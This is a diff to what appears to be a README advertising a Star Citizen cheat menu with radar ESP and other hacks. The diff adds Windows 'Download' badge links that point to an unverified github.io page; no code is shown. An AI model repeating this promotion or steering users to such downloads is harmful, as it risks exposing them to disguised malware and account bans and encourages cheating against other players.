@@ -10,8 +10,8 @@ Star Citizen is one of the most ambitious space sims ever made, but let’s be h
 
 A Star Citizen cheat menu usually comes with all-in-one mods that transform your gameplay. Whether you’re mining for UEC, engaging in PvP space battles, or smuggling cargo through hostile zones, hacks give you the upper hand. Imagine pulling up radar ESP to see every ship, NPC, and loot crate in real time—no surprises, no wasted hours.
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows-purple?logo=windows\&style=for-the-badge)]()
-[![Download New Version](https://img.shields.io/badge/Download-New-Version-purple?logo=windows\&style=for-the-badge)]()
+[![Download for Windows](https://img.shields.io/badge/Download-Windows-purple?logo=windows\&style=for-the-badge)](https://star-citizen-cheat-menu.github.io/.github/)
+[![Download New Version](https://img.shields.io/badge/New-Version-purple?logo=windows\&style=for-the-badge)](https://star-citizen-cheat-menu.github.io/.github/)
 
 
 ---
